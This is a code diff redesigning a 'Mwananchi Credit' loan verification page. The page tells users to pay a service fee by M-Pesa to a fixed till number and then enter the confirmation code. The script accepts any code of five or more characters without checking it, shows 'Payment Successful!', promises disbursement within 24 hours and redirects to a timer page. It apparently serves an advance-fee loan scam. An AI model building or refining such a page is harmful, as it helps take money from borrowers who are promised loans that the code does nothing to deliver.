@@ -18,79 +18,235 @@
 
   <!-- Fixed Logo -->
   <div class="fixed-logo">
-    <img src="mwananchi-logo.png" alt="Mwananchi Credit" class="h-12">
+    <div class="bg-white p-2 rounded-lg shadow-md">
+      <div class="text-[#002147] font-bold text-xl">Mwananchi</div>
+      <div class="text-[#f58220] text-sm font-semibold">CREDIT</div>
+    </div>
   </div>
 
   <!-- Card -->
   <div id="mainCard" class="bg-white text-gray-900 rounded-2xl shadow-lg p-6 w-full max-w-md mt-16">
-    <h2 class="text-2xl font-bold text-center mb-4 text-blue-900">Verify Your Loan Application</h2>
-    <p class="text-center text-gray-600 mb-6">Please confirm your loan details and complete payment instructions below.</p>
-
-    <div class="space-y-2">
-      <p><span class="font-semibold">Loan Amount:</span> KES <span id="loanAmount">0</span></p>
-      <p><span class="font-semibold">Service Fee:</span> KES <span id="serviceFee">0</span></p>
-      <p><span class="font-semibold">Interest:</span> KES <span id="interest">0</span></p>
-      <p><span class="font-semibold">Total Payable:</span> KES <span id="totalPayable">0</span></p>
-      <p><span class="font-semibold">Due Date:</span> <span id="dueDate">-</span></p>
+    <div class="text-center mb-6">
+      <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+        </svg>
+      </div>
+      <h2 class="text-2xl font-bold text-blue-900">Verify Your Loan Application</h2>
+      <p class="text-gray-600 mt-2">Please confirm your loan details and complete payment instructions below.</p>
     </div>
 
-    <div class="bg-gray-100 p-4 rounded-lg mb-4">
-      <h3 class="text-lg font-semibold mb-2">Payment Instructions</h3>
-      <ol class="list-decimal list-inside space-y-1 text-sm">
-        <li>Go to your M-Pesa menu.</li>
-        <li>Select <strong>Lipa na M-Pesa</strong> → <strong>Buy Goods & Services</strong>.</li>
-        <li>Enter <strong>Till Number</strong>: <span class="font-bold text-blue-800">9824375</span></li>
-        <li>Enter <strong>Amount</strong>: Service Fee</li>
-        <li>Enter your M-Pesa PIN and confirm.</li>
-      </ol>
+    <!-- Loan Details Summary -->
+    <div class="mb-6 p-4 bg-blue-50 rounded-xl border border-blue-200">
+      <h3 class="font-bold text-blue-800 mb-3 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
+        </svg>
+        Loan Summary
+      </h3>
+      
+      <div class="space-y-3">
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Principal Amount:</span>
+          <span class="font-semibold">Ksh <span id="principalAmount">0</span></span>
+        </div>
+        
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Service Fee:</span>
+          <span class="font-semibold text-[#f58220]">Ksh <span id="serviceFee">0</span></span>
+        </div>
+        
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Interest (5%):</span>
+          <span class="font-semibold">Ksh <span id="interest">0</span></span>
+        </div>
+        
+        <div class="pt-3 border-t border-blue-200">
+          <div class="flex justify-between items-center">
+            <span class="text-lg font-bold text-blue-900">Total Payable:</span>
+            <span class="text-xl font-bold text-[#f58220]">Ksh <span id="totalPayable">0</span></span>
+          </div>
+        </div>
+      </div>
     </div>
 
-    <div class="mb-4">
-      <label for="amount" class="block text-sm font-medium text-gray-700 mb-1">Enter Amount</label>
-      <input type="number" id="amount" readonly class="w-full p-3 border rounded-lg focus:outline-none bg-gray-200">
+    <!-- Customer Information -->
+    <div class="mb-6 p-4 bg-gray-50 rounded-xl border border-gray-200">
+      <h3 class="font-bold text-gray-700 mb-3 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+        </svg>
+        Customer Information
+      </h3>
+      
+      <div class="space-y-2">
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Phone Number:</span>
+          <span class="font-semibold text-blue-900" id="customerPhone">-</span>
+        </div>
+        
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Repayment Date:</span>
+          <span class="font-semibold text-blue-900" id="dueDate">-</span>
+        </div>
+        
+        <div class="flex justify-between items-center">
+          <span class="text-gray-700">Promo Code:</span>
+          <span class="font-semibold text-blue-900" id="promoCode">None</span>
+        </div>
+      </div>
     </div>
 
-    <div class="mb-4">
-      <label for="transaction" class="block text-sm font-medium text-gray-700 mb-1">Paste M-Pesa Confirmation Code</label>
-      <input type="text" id="transaction" placeholder="e.g. QBN1ZXY123" class="w-full p-3 border rounded-lg focus:outline-none">
+    <!-- Payment Instructions -->
+    <div class="bg-yellow-50 p-4 rounded-lg mb-6 border border-yellow-200">
+      <h3 class="text-lg font-semibold text-yellow-800 mb-3 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+        Payment Instructions
+      </h3>
+      <div class="text-sm text-yellow-700 space-y-2">
+        <div class="flex items-start">
+          <div class="bg-yellow-100 text-yellow-800 rounded-full w-6 h-6 flex items-center justify-center font-bold text-sm mr-2 flex-shrink-0">1</div>
+          <span>Go to your <strong>M-Pesa menu</strong></span>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-yellow-100 text-yellow-800 rounded-full w-6 h-6 flex items-center justify-center font-bold text-sm mr-2 flex-shrink-0">2</div>
+          <span>Select <strong>Lipa na M-Pesa</strong> → <strong>Buy Goods & Services</strong></span>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-yellow-100 text-yellow-800 rounded-full w-6 h-6 flex items-center justify-center font-bold text-sm mr-2 flex-shrink-0">3</div>
+          <span>Enter <strong>Till Number</strong>: <span class="font-bold text-blue-900 bg-yellow-100 px-2 py-1 rounded">9824375</span></span>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-yellow-100 text-yellow-800 rounded-full w-6 h-6 flex items-center justify-center font-bold text-sm mr-2 flex-shrink-0">4</div>
+          <span>Enter <strong>Amount</strong>: <span class="font-bold text-blue-900 bg-yellow-100 px-2 py-1 rounded" id="paymentAmount">0</span> Ksh</span>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-yellow-100 text-yellow-800 rounded-full w-6 h-6 flex items-center justify-center font-bold text-sm mr-2 flex-shrink-0">5</div>
+          <span>Enter your <strong>M-Pesa PIN</strong> and confirm</span>
+        </div>
+      </div>
     </div>
 
-    <button onclick="confirmPayment()" class="w-full bg-blue-800 hover:bg-blue-900 text-white p-3 rounded-lg font-semibold">Confirm Payment</button>
+    <!-- Transaction Code Input -->
+    <div class="mb-6">
+      <label for="transaction" class="block text-sm font-medium text-gray-700 mb-2 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
+        </svg>
+        Enter M-Pesa Confirmation Code
+      </label>
+      <input type="text" id="transaction" 
+             placeholder="e.g. QBN1ZXY123" 
+             class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#f58220] focus:border-transparent">
+      <p class="text-xs text-gray-500 mt-1">Enter the confirmation code you received from M-Pesa</p>
+    </div>
+
+    <!-- Action Buttons -->
+    <div class="space-y-3">
+      <button onclick="confirmPayment()" 
+              class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white p-3 rounded-lg font-semibold text-lg shadow-lg transition-all duration-200 transform hover:scale-[1.02] flex items-center justify-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        Confirm Payment
+      </button>
+      
+      <button onclick="window.history.back()" 
+              class="w-full bg-white border border-gray-300 text-gray-700 py-2 rounded-lg font-medium hover:bg-gray-50 transition flex items-center justify-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+        </svg>
+        Back to Edit
+      </button>
+    </div>
   </div>
 
-  <!-- Loader & Success -->
+  <!-- Loader -->
   <div id="loaderCard" class="hidden bg-white text-gray-900 rounded-2xl shadow-lg p-6 w-full max-w-md mt-16 text-center">
-    <div class="animate-spin rounded-full h-10 w-10 border-t-4 border-b-4 border-blue-800 mx-auto"></div>
+    <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-800 mx-auto"></div>
     <p class="mt-4 text-lg font-semibold text-blue-900">Processing Payment...</p>
+    <p class="text-sm text-gray-600 mt-2">Please wait while we verify your payment</p>
   </div>
 
+  <!-- Success -->
   <div id="successCard" class="hidden bg-white text-gray-900 rounded-2xl shadow-lg p-6 w-full max-w-md mt-16 text-center">
-    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-green-600 mx-auto mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-    </svg>
-    <p class="text-lg font-bold text-green-600">Payment Successful!</p>
-    <p class="text-sm text-gray-600 mt-1">Redirecting...</p>
+    <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+      </svg>
+    </div>
+    <h3 class="text-2xl font-bold text-green-600 mb-2">Payment Successful!</h3>
+    <p class="text-gray-600 mb-4">Your loan application has been submitted successfully.</p>
+    <div class="bg-green-50 p-3 rounded-lg mb-4">
+      <p class="text-sm text-green-700">Your loan amount will be processed and disbursed to your M-Pesa account within 24 hours.</p>
+    </div>
+    <div class="animate-pulse text-blue-900 font-semibold mt-4">
+      Redirecting to confirmation...
+    </div>
   </div>
 
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('loanAmount').textContent = localStorage.getItem('loanAmount') || '0';
-      let fee = localStorage.getItem('serviceFee') || 0;
-      fee = Math.round(fee);
-      document.getElementById('serviceFee').textContent = fee;
-      document.getElementById('amount').value = fee;
-      document.getElementById('interest').textContent = localStorage.getItem('interest') || '0';
-      document.getElementById('totalPayable').textContent = localStorage.getItem('totalPayable') || '0';
-      document.getElementById('dueDate').textContent = localStorage.getItem('dueDate') || '-';
+      // Get all data from localStorage
+      const selectedLoanAmount = localStorage.getItem('selectedLoanAmount') || localStorage.getItem('loanLimit') || '0';
+      const serviceFeeAmount = localStorage.getItem('serviceFeeAmount') || localStorage.getItem('serviceFee') || '50';
+      const interestAmount = localStorage.getItem('interestAmount') || '0';
+      const totalPayable = localStorage.getItem('totalPayable') || '0';
+      const phoneNumber = localStorage.getItem('phoneNumber') || '-';
+      const dueDate = localStorage.getItem('dueDate') || '-';
+      const promoCode = localStorage.getItem('promoCode') || 'None';
+      
+      // Format date if available
+      let formattedDate = '-';
+      if (dueDate !== '-') {
+        const dateObj = new Date(dueDate);
+        formattedDate = dateObj.toLocaleDateString('en-GB', {
+          day: '2-digit',
+          month: 'short',
+          year: 'numeric'
+        });
+      }
+      
+      // Format phone number
+      let formattedPhone = phoneNumber;
+      if (phoneNumber.startsWith('+254') && phoneNumber.length === 13) {
+        formattedPhone = phoneNumber.replace('+254', '0');
+      }
+      
+      // Display values
+      document.getElementById('principalAmount').textContent = parseInt(selectedLoanAmount).toLocaleString();
+      document.getElementById('serviceFee').textContent = parseInt(serviceFeeAmount).toLocaleString();
+      document.getElementById('interest').textContent = parseInt(interestAmount).toLocaleString();
+      document.getElementById('totalPayable').textContent = parseInt(totalPayable).toLocaleString();
+      document.getElementById('paymentAmount').textContent = parseInt(serviceFeeAmount).toLocaleString();
+      document.getElementById('customerPhone').textContent = formattedPhone;
+      document.getElementById('dueDate').textContent = formattedDate;
+      document.getElementById('promoCode').textContent = promoCode || 'None';
+      
+      // Also update the page title with amount
+      document.title = `Mwananchi Credit - Verify Ksh ${parseInt(selectedLoanAmount).toLocaleString()} Loan`;
     });
 
     function confirmPayment() {
       let code = document.getElementById('transaction').value.trim();
+      
       if (!code) {
-        alert("Please paste your M-Pesa confirmation code.");
+        alert("Please enter your M-Pesa confirmation code to proceed.");
+        document.getElementById('transaction').focus();
         return;
       }
-
+      
+      // Basic validation for M-Pesa code format
+      if (code.length < 5) {
+        alert("Please enter a valid M-Pesa confirmation code. It should be at least 5 characters.");
+        return;
+      }
+      
+      // Store transaction code
+      localStorage.setItem('transactionCode', code);
+      
       // Hide form, show loader
       document.getElementById('mainCard').classList.add('hidden');
       document.getElementById('loaderCard').classList.remove('hidden');
@@ -100,11 +256,11 @@
         document.getElementById('loaderCard').classList.add('hidden');
         document.getElementById('successCard').classList.remove('hidden');
 
-        // Redirect after short delay
+        // Redirect after delay
         setTimeout(() => {
           window.location.href = "timer.html";
-        }, 2000);
-      }, 2500);
+        }, 3000);
+      }, 3000);
     }
   </script>
 </body>
